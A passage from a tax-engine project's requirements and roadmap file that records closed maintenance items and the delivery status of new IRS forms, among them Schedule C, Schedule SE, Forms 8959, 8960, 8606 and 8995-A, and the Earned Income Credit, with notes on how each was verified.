- [x] **MAINT-01** *(T3)*: Decide whether the OCR-conversion island is wired or removed.

      **Closed (Phase 31): REMOVED.** `fjs/document/1099int/from_ocr` was imported by nothing and
      `fjs/document/ocr_amount` only by it, so both are deleted. The conversion duplicated the live
      path — this file puts PDF/OCR extraction in code permanently Out of Scope, and the agent's own
      vision pass emits both `vnd.fjs.ocr` and the typed document directly.

      **The `vnd.fjs.ocr` DIALECT stays**, registered in `fjs/server/finance_schema`; only the
      conversion path was orphaned. All 5 `fjs/server/dialect_parity` leaves and `ocrResolves` are
      green. The leaf-set diff is exactly the 17 leaves inside the two deleted modules — nothing
      that guards a live path was lost, since the live 1099-INT box reads are proved by
      `fjs/document/1099int` and `fjs/form1040/core`. AGENTS.md's layering rule cited `ocr_amount`
      as its example and was repointed at `fjs/exact` in the same commit.
      `fjs/document/1099int/from_ocr`, `fjs/document/ocr_amount` and `fjs/document/subject` are
      **unreachable from the running server** *(pre-Phase-31 finding, kept as history: the
      `from_ocr` and `ocr_amount` modules named here are the ones MAINT-01's resolution note above
      deleted, and they no longer exist. Marked 2026-08-17.)* — an import graph from `index.js` never touches them,
      and a guest program cannot reach them either, since EXEC-07 forbids imports inside a stored
      program. Either an ingest tool is still planned and they are pre-built, or `todo/plan.md`'s
      Track B (the agent reads by vision, emits the dialect, stores via the already-registered
      `evo_add`) supersedes them. Tested code that nothing can execute is worse than either outcome.

- [x] **MAINT-02** *(T3)*: Reconcile TEST-04 with reality — either meet it or amend it. It is
      marked complete and claims the integration layer is separable "so the per-commit loop stays
      fast", but `npm test` is an unfiltered `tsc && node --test` that runs both real-process tests
      alongside the proofs, for ~15s. There is no proofs-only path. Either add one, or amend the
      requirement to say what the project actually decided.

      **Resolved 2026-08-17: BOTH options taken, because the measurement falsified the
      requirement's own premise.** `npm run test:proofs` is the separable path; and TEST-04 is
      amended, because measuring it showed the proofs are the SLOW half (4260 tests / 52.7s)
      against every real-process test and gate combined (13 / 7.0s). Splitting them to keep the
      per-commit loop fast would skip the cheap half. It also surfaced that **the proof suite ran
      TWICE under `npm test`** — the parts summed to 4273 against 8533, a difference of exactly the
      proof count — a ~53s cost per run. The `~15s` in the sentence above was itself stale.

      **The double-run was DIAGNOSED and fixed on 2026-08-17**, after this entry was written
      recording it as an open item with the mechanism unknown: bare `node --test` was discovering
      the vendored `functionalscript` submodule's own `.ts` entry point, which re-scans the same
      working directory, so every finance proof was executed and printed twice. `npm test` is now
      pinned to `node --test *.test.js` and the suite runs 2253 tests. **The defect had
      been recorded for months as a "double-counted *metric*, advisory, remedy: de-duplicate"** —
      it was double-*run*. A workaround that works removes all pressure to look at why it was
      needed, which is what made this the most expensive bug in the project.

- [x] **MAINT-03** *(T3)*: Correct the requirement and roadmap claims that overstate what shipped.
      Known: TAX-02 says the Tax Table is "diffed row by row against Publication 1040" when ten rows
      are hand-transcribed and the remaining ~2,000 are checked against invariants that share code
      with the generator; DOC-04 describes `Number.isSafeInteger`-guarded integer cents when storage
      is canonical decimal strings; the v1 requirement total is written as 79 in one place and 83 in
      another while **95** IDs are defined. (That last figure read 85 until 2026-08-15 — it was
      already stale before the DOC-18/TAX-18 retrofit, not made stale by it. A pending item whose
      job is to fix wrong counts, carrying a wrong count, is the defect describing itself.)

      **Resolved 2026-08-17.** TAX-02 and DOC-04 are corrected IN PLACE, each stating what it no
      longer claims and why the old text would have misled — TAX-02's "diffed row by row" claimed a
      per-row comparison against a source not in the repository, and its ~2,000 invariant-checked
      rows share code with the generator, so they prove internal consistency and not agreement with
      the IRS. DOC-04 described a `Number.isSafeInteger` guard on a design that deliberately holds
      money in `bigint`, so no such ceiling exists to guard. The 79/83/95 count divergence is
      handled the only way that lasts: ROADMAP.md and REQUIREMENTS.md now carry the derivation
      COMMAND beside each figure, and the surviving 79/83 mentions are framed as history.

- [x] **MAINT-04** *(T3)*: Fix the documentation that contradicts the code. DOCC-01 is checked and
      its own verification document asserts a grep is clean, but `fjs/todo/implement-mcp-server.md`
      still carries the `djs/parser` remedy verbatim along with the "sole user is trusted and local"
      rationale DOCC-05 was meant to remove. Separately, that file still reads "Status: spec, not
      implemented" and marks two questions "blocking, resolve before implementing" that are shipped
      and proven.

      **Resolved 2026-08-17, and it was worse than this entry said.** `fjs/todo/implement-mcp-server.md`
      led with `Status: **spec, not implemented**` — through all ten phases of milestone v2, which
      were built on top of it. Now records the shipped server (13 tools, protocol 2025-11-25) with
      the command to verify it by starting it rather than by reading the file, and warns that the
      rest of the document is a historical spec. Both DOCC-05 relics are gone: the "only user is
      trusted and local" rationale (struck from the risk record — the risk is accepted and deferred,
      not excused by who holds the keyboard) and the `djs/parser` remedy (a module this project does
      not use; the recorded v2 item is a validator on `fjs/js/tokenizer` + `fjs/bnf`, and only "for
      portability, not security"). Replaced with what is actually proven, which is narrower than
      either reading.

- [x] **MAINT-05** *(T3)*: Repair `fjs/todo/upstream-mcp-protocol-version-negotiation.md`'s proposed
      fix, which does not work as written. It compares "the now-already-validated
      `pr.protocolVersion`", but `mcpStep` destructures `const [pr] = validate(...)` — binding only
      the result tag, so `pr.protocolVersion` is `undefined` and the comparison is vacuous. A note
      whose remedy is wrong is worse than no note.

      **Resolved 2026-08-17, claim verified against the upstream source first.**
      `node_modules/functionalscript/fjs/protocol/mcp/module.f.js:234` is `const [pr] = validate(initializeParams)(params)` (an upstream file — there is no `fjs/protocol/` in this repository, and the path was written without the prefix until 2026-08-17) and
      line 235 compares `pr === 'error'` — so `pr` is the Result TAG and `pr.protocolVersion` is
      `undefined` on every input. The proposed comparison was not merely vacuous but
      unconditionally TRUE, i.e. a negotiation that rejects every client including a correct one.
      The note now widens the destructuring to `const [pr, pv]` first and compares
      `pv.protocolVersion`, with the broken version quoted so the correction is checkable.

- [x] **MAINT-06** *(T3)*: Take `functionalscript` 0.43.0. **Satisfied literally, and its intent is
      blocked upstream — measured, not assumed.** `package.json` declares `^0.43.1`, so the version
      this requirement names is taken and current within its own major line; the four
      `fjs/todo/upstream-*.md` notes were re-checked against upstream `main` and one was **retired
      and deleted** (`upstream-json-parse-split.md` — `parse` is tokenizer-backed and total at
      0.43.1, and its own text mandated deletion once adopted).

      The intent — *be on the newest release* — is not met and cannot be met from inside this
      repository:

      | version | release commit | `tsc --noEmit` |
      |---|---|---|
      | **0.43.1 (kept)** | `cc93a3ca` | **0 errors** |
      | 0.44.0 | `37db36c0` | **1287 errors** |
      | 0.45.0 (npm current) | `8804e783` | **1288 errors** |

      Upstream migrated to `.f.mjs` and then **dropped the `.js` emit**, so every
      `'functionalscript/.../module.f.js'` specifier is `TS2307`. Rewriting all **396 files / 1900
      occurrences** was measured on a throwaway snapshot and **still leaves 288 errors across 60
      files**, because the shipped `.d.mts` files `import type` the core vocabulary
      (`Cas`, `Effect`, `Result`, `Unknown`, `OperationMap`, …) and never re-export it. Every
      mechanical fix for that residue is a cast, an `any`, or a re-declared local type — **all three
      forbidden by AGENTS.md**.

      **Resolved by decision rather than left open:** stay on 0.43.1, and the upstream change that
      unblocks the bump was specified in `fjs/todo/upstream-mjs-migration.md` — retired by `1924cef`
      once its conditions were met; the surviving account is
      `.planning/reports/fjs-0.46.1-migration.md` (one
      `export type { … }` per relocated type, beside the `import type` already there), with its
      retirement condition. Half-doing the migration would have traded a working build for 288
      errors and a forbidden construct at each one.

- [x] **MAINT-07** *(T3)*: Share `executeRun`'s step sequence with `runExecuteRunViaFixture`.
      The rule duplication was removed in 09-05/09-06 (`classifyRunOutcome` now lives once, in
      `fjs/report/guard`), but the ORDER of `loadProgram` → `buildRunSnapshot` → `buildHostMap` →
      `interpret` is still written out twice. Reorder or insert a step in `executeRun` and the
      fixture helper will not follow; only the integration test would notice, and only if the change
      is observable end to end. The helper itself must stay — `fjs/effects/node/virtual` genuinely
      cannot compose a write with an import in one session.

      **Resolved (Phase 18).** The order now lives once, in `fjs/server/fjs_run/module.f.js`'s
      shared `load → snapshot → interpret → classify` tail, documented there as "the ONLY
      definition of its order". Only the *heads* diverge, deliberately and for the reason above.
      This entry was ticked with no resolution note until 2026-08-17, so the stale description was
      the only text under the tick — the same defect the requirement itself is about.

- [x] **MAINT-08** *(T3)*: Remove or share the two small duplications a dead-code audit found: the
      `formRevision must not be empty` check written out byte-identically in
      `fjs/document/1099int` and `fjs/document/w2` (conspicuous because its sibling money-box rule
      *is* correctly shared via `moneyFieldError`), and `artifactSubject` in
      `fjs/document/subject`, which is the identity function with zero callers.

      **Resolved (Phase 18).** The check is shared as `fjs/document/form_revision` — `grep -rn
      'formRevision must not be empty' fjs/` hits that module and nothing else — and
      `artifactSubject` is deleted, with `grep -rn artifactSubject fjs/` returning nothing.
      Ticked with no resolution note until 2026-08-17.

---

## v2 Requirements — The Product Path and Four Personas

**Opened 2026-08-15 by owner decision**, triggered by `.planning/PERSONA-COVERAGE.md`, which
measured the engine against four taxpayers: a retiree, a non-profit employee, a FAANG engineer
and a startup founder. At the time of that survey, one of the four was supported, one computed a *wrong* return, and two refused. **All four now compute** — see the v2 traceability table below. The present-tense sentence stood here until 2026-08-17, after every phase that fixed it had shipped.

**These 32 requirements are counted separately from v1's 95** and do not move v1's completion
figure. (This read 25 until 2026-08-19, when TAX-36 through TAX-39 — coined in code and traced
nowhere — were retrofitted into their own section below, 29 until Form 461 and Form 4797 landed
as TAX-40 and TAX-41, and 31 until Form 2555 landed as TAX-42. **It said 29 through both of the
first two**, because each of those branches moved the derived figure in the footer below and not
this sentence; re-deriving during this integration is what caught it, which is the whole argument
for the command block at the end of this section.) v1 remains what it always was: a 65+ TY2025 return with brokerage, dependents and
itemizing, which is complete, the eight MAINT items included — MAINT-01 through MAINT-06 closed on 2026-08-17 and MAINT-07/08 in Phase 18. (This read "apart from the eight open MAINT items" until they were all closed.)

> **Read the ordering constraint before planning any of this.** TAX-19 (computable tripwires)
> comes first and is not negotiable. Every requirement below adds a form the engine will
> compute, and each one that lands *without* TAX-19 widens the window in which the engine
> answers confidently and wrongly. The survey's central finding is that declaration-driven
> scoping cannot see a tax that triggers on a threshold from data the engine already holds —
> so a $300k W-2 silently understated by ~$900 when this was written — TAX-19 and TAX-20 closed it, and the same ~$900 is now the asserted figure on Schedule 2 line 11. Adding forms before closing that is
> building faster on the one foundation known to be cracked.

### The Product Path (EXEC, PROV)

- [x] **EXEC-14** *(M2, T0)*: The 1040 engine reachable from a stored guest program — **via
      `guestCtx`, never via a server tool.** `guestCtx` already carries pure non-effect helpers
      (`step`, `pure`, `centsFromString`, `centsToString`) alongside the four frozen CAS
      commands, and `_CasOpIsExactlyTheFourCommands` pins the *effect* vocabulary, not the
      context. `form1040Report` and the dialect validators join that pure list. The agent still
      authors the program; the program calls the engine and decides what to report. **This is
      the deliberate alternative to the forbidden `finance_compute_1040` tool** — see Out of
      Scope, where the distinction is recorded and the tool re-affirmed as forbidden.

      **Delivered by Phase 21 (PR #71, merge `75b6f5b`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `fjs/guest/tax/module.f.js` exists, and `taxGuestCtx` is written as a
      SPREAD of `guestCtx` plus `taxParams` and `form1040Report(taxParams)` rather than a
      re-listing of the ABI — `taxGuestCtxCarriesTheWholeGuestAbiUnchanged` pins each of the eight
      members by `Object.is` against `guestCtx`'s own, and `form1040Report` is asserted absent from
      `casOpNames` so it is a pure value on the context, never a command. **`fjs/guest/module.f.js`
      is byte-identical to its pre-Phase-21 state** (`git diff e085ced develop --
      fjs/guest/module.f.js` is empty), which is what keeps the payer report's transitive gate
      green. Measured against a live server on 2026-08-17: `tools/list` reports exactly **13**
      tools, and not one of them names 1040 or "compute".
- [x] **PROV-09** *(M2, T0)*: A real return produced through the product path end to end —
      documents stored via `evo_add`, a program stored in CAS and executed by `fjs_run`, the
      result written as a `vnd.fjs.run` record. This is what makes Phase 19's provenance header
      and PROV-05's pinned reproduction apply to an actual 1040 rather than to a fixture; today
      neither has ever run against one.

      **Delivered by Phase 21 (PR #71, merge `75b6f5b`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `tax-return-integration.test.js`'s `EXEC-14/PROV-09` leaf drives a real
      1040 through a genuinely separate `fjs_run` process and passes in the full suite (~58s of its
      runtime). Its pinned leg is a real reproduction rather than a tautology: an amendment is
      landed and the UNPINNED rerun is first OBSERVED to move, then two pinned runs against the
      same subject return the identical `resultHash` and byte-identical result bytes across a
      second intervening amendment, and the reproduced bytes are asserted to be `kind: 'ok'` — a
      real return, not a stored error value.

### The Safety Net (TAX)

- [x] **TAX-19** *(M2, T0)*: **Computable tripwires** — a table of (predicate over the stored
      documents) → (kind that MUST have been declared), asserted before any line is computed.
      Box 5 over the Additional Medicare Tax threshold implies `scheduleTwoTaxes`; any 1099-NEC
      implies self-employment; non-zero 1099-R box 3 implies capital-gain treatment. This is
      the complement to `fjs/return/scope`'s declaration-driven guard, not a replacement:
      that guard is sound against the store-driven alternative for the reason its own docstring
      records, but it rests on the taxpayer knowing what they owe — which is the thing they
      came to a tax engine not to have to know. Converts silent understatement into refusal.

      **Delivered by Phase 22 (PR #72, merge `c449e0e`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `fjs/return/tripwire/module.f.js` exists and carries the
      predicate → required-kind table, and `form1040Report` calls `classifyTripwires` and returns
      its refusal **strictly before `computeForm1040` runs** — so no printed line is computed for a
      return the tripwires reject. The filing status is narrowed at that call site precisely because
      the Additional Medicare Tax threshold is per-status and there is nothing earlier to thread it
      from, which is the ordering stated as a comment at the site and true in the code.

### FAANG: Schedule 2 Populated (TAX)

- [x] **TAX-20** *(M2, T1)*: **Form 8959**, Additional Medicare Tax — 0.9% above $200,000
      single / $250,000 MFJ / $125,000 MFS, thresholds statutory and **not inflation-indexed**.
      Feeds Schedule 2 line 11 → 1040 line 23. Mandatory, not elective: this is what blocks
      every high-wage return today.

      **Delivered by Phase 23 (PR #73, merge `1a3a80e`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `fjs/form8959/module.f.js` exists, `additionalMedicareTax` is a member of
      `modeledKinds` in `fjs/return/scope`, and the whole route is wired: Form 8959 line 18 becomes
      Schedule 2 line 11, which enters Schedule 2's line 21 total, which IS 1040 line 23. Proven at
      a real figure — Schedule 2's own `line11` proof asserts `$900.00` on `$100,000.00` of excess
      and the same `$900.00` reaching line 21. Form 8959 line 24 additionally reaches **1040 line
      25c**, without which the return would charge a high-wage filer $900 already withheld.
- [x] **TAX-21** *(M2, T1)*: **Form 8960**, Net Investment Income Tax — 3.8% on the lesser of
      net investment income or MAGI over the same unindexed thresholds. Note AGENTS-relevant
      hazard: this MAGI has its own add-back list, so TAX-15's "no variable named `magi`" rule
      applies with full force.

      **Delivered by Phase 23 (PR #73, merge `1a3a80e`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `fjs/form8960/module.f.js` exists and `netInvestmentIncomeTax` is a member
      of `modeledKinds`; Form 8960 line 17 becomes Schedule 2 line 12 and reaches 1040 line 23
      through the same line 21 total. The TAX-15 hazard held: the root-level acronym gate is green
      across `fjs/**`, and it demonstrated on 2026-08-17 that it is still load-bearing by reddening
      on a new docstring that merely *named the gate's own filename* in lowercase.
- [x] **TAX-22** *(M2, T2)*: `scheduleTwoTaxes` splits from one coarse refused kind into
      per-line kinds, so what remains refused on Schedule 2 is nameable. Reclassify **only**
      the lines actually wired, in the same commit — the wire-before-reclassify discipline
      Phases 12.1, 13 and 20 all followed.

      **Delivered by Phase 23 (PR #73, merge `1a3a80e`, 2026-08-16); ticked 2026-08-17 on
      re-verification.** `grep -c "'scheduleTwoTaxes'" fjs/return/profile/module.f.js` returns
      **0** — the coarse kind is gone from the declarable vocabulary, and every remaining mention of
      the name anywhere under `fjs/` is prose recording that it was split. In its place are per-
      printed-line kinds: four now modeled (`alternativeMinimumTax`, `selfEmploymentTax`,
      `additionalMedicareTax`, `netInvestmentIncomeTax`) and the rest refused individually, each
      naming its own printed line and the form or fact that would supply it.

### Non-Profit: Schedule 1 Part II and Schedule 3 (TAX, DOC)

- [x] **TAX-23** *(M2, T2)*: **Schedule 1 line 21**, student loan interest deduction, with its
      phase-out. Today a hard zero — the single largest silent overstatement for this persona.

      **Delivered (Phase 24).** `fjs/schedule/1` line 21 computes from the `vnd.fjs.1098e`
      dialect, with §221(b)(2)'s phase-out in `fjs/tax/params`. No longer a hard zero; this entry
      carried no delivery note until 2026-08-17.
- [x] **TAX-24** *(M2, T2)*: **Schedule 1 line 11**, educator expenses; **line 13**, HSA
      deduction (Form 8889). Both hard zeros today.

      **Delivered (Phase 24).** `fjs/schedule/1` lines 11 and 13 both compute, line 13 through
      `fjs/form8889`, both fed by `vnd.fjs.adjustments` (DOC-19). Neither is a hard zero; this
      entry carried no delivery note until 2026-08-17.
- [x] **TAX-25** *(M2, T2)*: **Form 8880**, the Saver's Credit → Schedule 3 line 4.
- [x] **TAX-26** *(M2, T2)*: **Form 8863**, American Opportunity and Lifetime Learning credits
      → Schedule 3 line 3 and 1040 line 29.
- [x] **TAX-27** *(M2, T2)*: **Earned Income Credit** → 1040 line 27a, fully refundable.
      **DELIVERED as a computation in Phase 32**, and the box is checked because the credit
      genuinely computes end to end through `form1040Report` for a filer whose profile carries
      §32's facts — not because a refusal got better prose.
      Phases 25 through 31 left this box deliberately unchecked, and that record is kept rather
      than deleted: the reason was that `vnd.fjs.return_profile`'s `dependents` array was built
      for Schedule 8812's two-fact test (age under 17, an employment-valid SSN) and carries
      almost none of §32(c)(3). That finding was correct. What Phase 32 did was add the facts
      rather than argue with it — ten checked vocabularies on the profile, five per dependent
      (§32(c)(3)'s relationship, full-time-student status, permanent and total disability,
      United States residency for more than half the year, and the joint-return test) and five
      about the filer (§32(m)'s two social security numbers, §32(c)(1)(B)'s
      qualifying-child-of-another question, and §32(c)(1)(A)(ii)'s age band and abode). Each is
      two or more exact strings rather than `option(true)`, following
      `fjs/document/business_expenses`' SSTB precedent, because here the wrong default GRANTS a
      credit.
      `fjs/schedule/eic` is Worksheet A, Worksheet B and the 2025 EIC Table; the table is a rule
      rather than stored data, and it reproduces all 10,856 published entries. §32(i)'s
      disqualified-income test computes four of its five components and REFUSES by name for the
      rent-and-royalty one. Every fact the profile does not carry refuses by name, and only where
      the answer turns on it. A return that does not declare `earnedIncomeCredit` computes
      exactly what it computed before.
- [x] **DOC-19** *(M2, T2)*: `vnd.fjs.adjustments` — the taxpayer-asserted record behind the
      Schedule 1 Part II adjustments, following `vnd.fjs.medical_expenses` exactly: no IRS
      information return reports educator expenses or HSA contributions to the filer, so the
      dialect is asserted rather than transcribed, and carries no computed total.

### Retiree Completion (TAX)

- [x] **TAX-28** *(M2, T2)*: **Qualified Charitable Distributions.** A QCD is a taxpayer
      *election*, not a 1099-R box — the custodian reports the gross distribution and the filer
      writes "QCD" beside 1040 line 4b. Today the engine taxes it in full and **overstates
      silently**. Needs a profile-level election plus the line-4b reduction, with the $108,000
      (TY2025, indexed) per-person cap.

      **Shipped (Phase 26), with one deliberate deviation and two named gaps.** The election
      reduces 1040 line 4b while line 4a stays gross, capped at §408(d)(8)(A)'s $108,000 per
      INDIVIDUAL (`fjs/tax/params`, with its indexing history and a citation, never a literal).

      *The deviation*: the election is **document-level, not profile-level** — a new
      `vnd.fjs.ira` dialect rather than fields on `vnd.fjs.return_profile`. Three reasons, all
      of which the profile cannot meet: the cap is per person and the profile carries no TIN at
      all; each gift must name the distribution it came out of by `(payerTin, accountNumber)`,
      which is what makes "this came from a 401(k), not an IRA" and "this exceeds the
      distribution it claims to come from" refusable rather than merely wrong; and a joint
      return has two elections, not one.

      *Gap 1 — the 70½ test is ASSERTED, not derived, and its absence REFUSES.* §408(d)(8)(B)(ii)
      requires age 70½ **at the time of the distribution**. This engine cannot determine that:
      **no birth date is stored anywhere in this repository**, the nearest fact is 1040 line
      12d's `taxpayerBornBeforeJan2_1961` (a **65** test, four and a half years short), and even
      a birth date would not settle a test taken at a *date* the engine only has as 1099-R box
      13 free text. The one derivable direction — attaining 70½ in 2025 implies the 12d box —
      IS checked, so an unchecked box contradicts the assertion and refuses. Residual: on a
      joint return the check uses the UNION of the two 12d boxes, because no TIN links a record
      to a person, so a 60-year-old spouse's QCD passes on the elder's box.

      *Gap 2 — §408(d)(8)(F)'s one-time split-interest election refuses by name*, quoting both
      its own $54,000 sub-cap and the $108,000 it sits inside. It is once per LIFETIME, spanning
      years this engine cannot see, and needs a statement attached to the return.
- [x] **TAX-29** *(M2, T2)*: **Form 8606**, nondeductible IRA basis and the pro-rata rule.

      **Closed (Phase 31): Part II computed, Part III decided by code.** Phase 26 shipped Part I and
      refused Parts II and III, so a backdoor Roth was not computable — which is why this box stayed
      unticked. Phase 31 closes it:

      *Part II (conversions) is COMPUTED*, and it SHARES Part I's pro-rata fraction rather than
      re-deriving it: printed line 8 became an input to `form8606PartI`, line 11 is the conversion's
      nontaxable portion, and lines 16/17/18 read off lines 8/11. `line17 === line11` is asserted as
      an identity so no second §408(d)(2) derivation can return. Printed line 7 now excludes the
      converted amount beside the QCD. A backdoor Roth computes end to end through `form1040Report`.

      *Part III is split by box 7a code, which is where the multi-year facts start.* Code `Q`
      COMPUTES — tax-free, no Part III — because the payer certified §408A(d)(2)'s five-year period
      itself. Codes `T` and `J` REFUSE BY NAME for different missing facts: `T` for
      §408A(d)(2)(B)'s five-year period (the whole difference between `T` and `Q`), `J` for lines 22
      and 24's cumulative Roth bases and §408A(d)(3)(F)'s per-conversion clock. **Refusing rather
      than defaulting matters more here than almost anywhere else: a Roth basis carried forward
      wrong misstates every later year, not just this one.**

      *A silent understatement fixed on the way.* Phase 26's Part III gate sat behind `partIApplies`
      inside the per-record loop, so a Roth distribution with no traditional-IRA basis reached no
      gate — and because box 7b is deliberately unchecked on a Roth Form 1099-R, `fjs/form1040/core`
      classified it as a PENSION. Probed at the full report: a code-`J` distribution of $20,000.00
      with box 2a blank gave 1040 line 5b = $0.00 and a tax of $0.00, refusing nothing. The gate now
      sits over the documents and Forms 1099-R partition three ways, not two.
      Without it, after-tax IRA money is taxed twice. Also the piece that makes a backdoor Roth
      computable, which is why it serves the FAANG persona as much as the retiree.

      *(**Phase 26 record, kept as history.** Where the text below says the box is unticked, Part II is refused, or a backdoor Roth is not computable, read the Phase 31 note above instead: Part II computes, Part III is decided by code, and a backdoor Roth computes end to end. Marked 2026-08-17, because a bolded "UNTICKED DELIBERATELY" against a `[x]` gives a reader no way to tell which wins.)*

      **UNTICKED DELIBERATELY: the first sentence ships and the second does not.** Phase 26
      built Form 8606 **Part I** in full — §408(d)(2)'s pro-rata rule over the **aggregated**
      year-end value of every traditional/SEP/SIMPLE IRA one person owns (a two-IRA case is
      proven distinct from a one-IRA case at the same total), the prior year's line 14 carried
      forward through a new `vnd.fjs.prior_year_ira_basis` dialect, and line 15c reaching 1040
      line 4b. So after-tax IRA money is no longer taxed twice, which is the requirement's own
      stated harm.

      **But a backdoor Roth is not computable, and this requirement says it should be.** A
      backdoor Roth is a nondeductible contribution *plus a conversion to a Roth IRA*; the
      conversion is Form 8606 **Part II**, which is refused by name (`netAmountConvertedToRoth\
      Iras`), because line 18 is a second amount landing on 1040 line 4b beside line 15c and
      §408A(d)(3)'s recapture regime is unmodelled. **Part III** (distributions from Roth IRAs)
      is likewise refused, detected off Form 1099-R box 7a codes J/T/Q rather than off an
      assertion, since a Roth distribution arrives as a document. So the FAANG half of this
      requirement is untouched and the box stays empty.

      Also refused by name rather than ignored: an absent aggregated year-end value (the
      pro-rata denominator, which no document reports and which has no defensible default), an
      outstanding rollover or recharacterization, a Form 8915-F qualified disaster distribution,
      and a stored basis with no `vnd.fjs.ira` record beside it.

### Startup Founder: Self-Employment (DOC, TAX) — reversed from Out of Scope 2026-08-15

- [x] **DOC-20** *(M2, T2)*: `vnd.fjs.1099nec` — nonemployee compensation. Three boxes and
      genuinely a morning's work; the Out-of-Scope entry that forbade it until today called
      that simplicity "a trap" and was right about what follows.

      Delivered 2026-08-16. Box 1, box 2 (the direct-sales checkbox), box 3 (the printed
      form's own reserved box, refused when non-zero), box 4 and boxes 5-7 as an ARRAY of
      state rows. **Box 2 is not inert**: a ticked one means the recipient resells consumer
      products, so the goods are inventory (Part III) and the resale proceeds appear on no
      information return — `fjs/schedule/c` refuses it by name rather than reading a
      reseller's wholesale purchases as their gross receipts.
- [x] **DOC-21** *(M2, T2)*: `vnd.fjs.business_expenses` — the taxpayer-asserted record behind
      Schedule C Part II, categorised to the printed form's own expense lines. Same asserted
      shape as DOC-19 and `vnd.fjs.medical_expenses`.

      Delivered 2026-08-16. Three departures from DOC-19, each stated at the site: one
      document is one BUSINESS (so `accountNumber` is required and DOC-01's subject key
      separates two Schedule Cs), the date rule is the strict same-year one, and a negative
      amount is refused. It also carries
      `grossReceiptsFullyReportedOnForms1099Nec` — a field that exists only so an
      uncomputable return can say so out loud, because §6041A requires a 1099-NEC only at
      $600 and only from a trade or business, so a Schedule C line 1 read from Forms
      1099-NEC alone would silently understate gross receipts.
- [x] **TAX-30** *(M2, T3)*: **Schedule C**, all parts, one named pure function per printed
      line group, feeding Schedule 1 line 3 → 1040 line 8.

      Delivered 2026-08-16, and the tick means the SCHEDULE, not the self-employed return.
      Eighteen of the twenty-five printed expense lines compute, Part I's income arithmetic
      and Part V's line 48 compute, and line 31 reaches Schedule 1 line 3 → 1040 line 8
      through Schedule 1's own Part I total. Parts III and IV are named functions for named
      printed parts that refuse. Seven expense categories refuse by name, each naming the
      form or the facts that would supply it.

      **Three refusals bound what a taxpayer can actually file, and they are the reason
      Phase 28 exists rather than being optional:**

      - **A net LOSS refuses.** The printed form's own "if a loss, you must go to line 32"
        is an at-risk determination §465 makes from a multi-year basis history no document
        here holds; §469 and §461(l) stand behind it. The arithmetic loss is an upper bound
        on the deductible loss, so letting it reach Schedule 1 line 3 would understate tax
        while moving AGI and everything downstream of it.
      - **A net profit at or above §1402(b)(2)'s $400 refuses**, because self-employment tax
        is NOT elective and the scope guard only refuses a kind the taxpayer declares. A
        filer declaring `businessIncomeOrLoss` alone would otherwise have received a
        complete-looking 1040 with Schedule 2 line 4 at zero — about $7,000 short on a
        $50,000 profit. **TAX-31 (Phase 28) lifted this on 2026-08-16**: the refusal is
        deleted, Schedule SE computes, and a $50,000 profit now carries $7,064.78 of
        self-employment tax to Schedule 2 line 4.
      - **A statutory-employee W-2 refuses.** `vnd.fjs.w2`'s `box13StatutoryEmployee` had
        been modeled since the dialect was written and read by nothing; those wages belong
        on Schedule C line 1, not 1040 line 1a, and this engine puts them on line 1a where
        no expense can reach them.

      So the largest Schedule C this engine would put on a 1040 was one whose net profit
      was under $400. Everything above that computed every printed line and then refused,
      by name, at the last step — **until TAX-31 landed on 2026-08-16**. Of the three
      refusals above, the second is gone and the other two stand unchanged: a net LOSS
      still refuses on §465 grounds, and a statutory-employee W-2 still refuses.
- [x] **TAX-31** *(M2, T3)*: **Schedule SE**, self-employment tax — the 92.35% net-earnings
      factor, the Social Security wage base ceiling coordinated with W-2 box 3 wages already
      counted, and the uncapped Medicare component. Feeds Schedule 2 line 4, and its deductible
      half feeds Schedule 1 line 15 (a hard zero today). **Depends on TAX-20/22**, since both
      land on Schedule 2.

      Delivered 2026-08-16, and every clause of the sentence above is real. Part I's twenty
      printed lines compute; line 12 reaches Schedule 2 line 4 → 1040 line 23 and line 13
      reaches Schedule 1 line 15 → 1040 line 10, out of ONE execution. The 92.35% factor is
      **derived** from §1401's two rates per §1402(a)(12) rather than stored, so the printed
      0.9235 has one source of truth. The wage base is shared with **Form W-2 box 3** (never box
      5) plus box 7, wages first, and matched on `recipientTin` so a spouse's wages cannot
      shelter the proprietor's earnings. Form 8959 Part II line 8 now reads Schedule SE line 6,
      which is what Phase 23 wrote its threshold coordination for.

      **Phase 27's §1402(b)(2) ceiling is gone**: a Schedule C net profit of any size now
      computes end to end, and the $400 question is asked once, on the form that prints it,
      against net EARNINGS rather than net profit.

      **What the tick does NOT mean.** Four printed things on this form still refuse by name:
      Part II's farm and non-farm **optional methods** (elective, and no document records an
      election), **church employee income** and §1402(g)'s Form 4029/4361 **exemption** (nothing
      on a W-2 marks either), Schedule F farm income on lines 1a/1b, and Form 4137/8919 amounts
      on lines 8b/8c. The first two are new `fjs/return/scope` kinds, so a taxpayer with either
      is told. A **non-joint** return carrying a Form W-2 issued to a different `recipientTin`
      with Social Security wages on it also refuses, because the wage base is per person and the
      engine cannot tell which of the two records is wrong.
- [x] **TAX-32** *(M2, T3)*: **Form 8995 / 8995-A**, the QBI deduction → 1040 line 13a, with
      the SSTB phase-in and the W-2-wage/UBIA limitations. Depends on TAX-30.

      **COMPLETE 2026-08-17 (Phase 31).** All three things this requirement names now compute.
      Form **8995-A**'s forty printed lines and **Schedule A (Form 8995-A)**'s lines 2-13 are
      transcribed in `fjs/form8995a`, from `f8995a.pdf` and `f8995aa.pdf` fetched that day, and
      1040 line 13a is routed through that module for every return — Form 8995 below the
      threshold, Form 8995-A above it. Phase 28's above-threshold refusal is gone.

      - **The SSTB reduction is on SCHEDULE A, not Part II**, and it scales all three of
        qualified business income (line 11 → form line 2), W-2 wages (line 12 → form line 4)
        and UBIA (line 13 → form line 7). Above threshold+range the applicable percentage floors
        at zero, which is the printed header's *"doesn't qualify for the deduction"*.
      - **Part III phases in the W-2-wage/UBIA limitation**, gated on the printed second
        condition *"and line 10 is less than line 3"*. The two limbs of §199A(b)(2)(B) — 50% of
        wages, and 25% of wages plus 2.5% of UBIA — are separately named returned fields with a
        fixture where each BINDS and a perturbation in each direction.
      - **`fjs/tax/params` gains `phaseInRange`**, $50,000/$100,000 per §199A(b)(3)(B)(ii),
        stored and never derived: 25% of $197,300 is $49,325, $675 short, and the threshold is
        indexed while the range has no adjustment clause at all.
      - **Below the threshold the two forms agree TO THE CENT**, asserted at four taxable
